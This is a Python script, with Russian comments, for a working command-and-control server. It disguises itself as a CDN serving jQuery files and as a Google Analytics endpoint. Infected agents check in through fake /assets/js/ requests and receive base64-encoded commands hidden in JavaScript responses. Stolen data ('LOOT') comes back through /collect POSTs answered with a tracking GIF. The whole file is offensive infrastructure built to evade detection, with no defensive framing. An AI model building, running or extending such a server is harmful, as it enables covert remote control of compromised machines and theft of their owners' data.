#!/usr/bin/env python3
# Настоящий C2 — маскировка под nginx/CDN
import http.server, json, os, time, base64

AGENTS_DIR = os.path.expanduser('~/.shadow_agents')
os.makedirs(AGENTS_DIR, exist_ok=True)

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Маскировка под статический контент
        if self.path.startswith('/assets/js/'):
            agent_id = self.path.split('/')[-1].replace('.js','')
            agent_data = {
                'hostname': self.headers.get('User-Agent','?')[:30],
                'ip': self.client_address[0],
                'last_seen': time.time()
            }
            with open(os.path.join(AGENTS_DIR, f'{agent_id}.agent'), 'w') as f:
                json.dump(agent_data, f)
            
            # Команда в ответе — спрятана в JavaScript-комментарии
            cmd_file = os.path.join(AGENTS_DIR, f'{agent_id}.cmd')
            if os.path.exists(cmd_file):
                with open(cmd_file) as f:
                    cmd = f.read().strip()
                os.remove(cmd_file)
                js_response = f'/* jQuery v3.7.1 | (c) OpenJS Foundation */\nvar _x="{base64.b64encode(cmd.encode()).decode()}";'
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.send_header('Cache-Control', 'public, max-age=3600')
                self.end_headers()
                self.wfile.write(js_response.encode())
            else:
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.end_headers()
                self.wfile.write(b'/* OK */')
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        # Маскировка под Google Analytics
        if self.path.startswith('/collect'):
            content_len = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_len).decode()
            print(f'\n[LOOT] {base64.b64decode(data).decode()[:200]}')
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    port = int(os.environ.get('C2_PORT', 443))
    print(f'[C2] Listening on {port}')
    http.server.HTTPServer(('0.0.0.0', port), C2Handler).serve_forever()
